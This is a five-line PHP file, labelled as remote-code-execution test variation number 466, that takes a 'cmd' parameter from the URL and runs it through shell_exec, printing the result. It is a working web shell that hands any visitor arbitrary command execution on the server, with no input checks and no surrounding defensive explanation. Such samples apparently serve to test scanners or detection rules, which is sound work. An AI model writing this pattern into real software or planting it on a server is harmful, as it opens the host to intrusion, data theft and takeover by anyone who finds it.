<?php
// RCE test variation #466
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>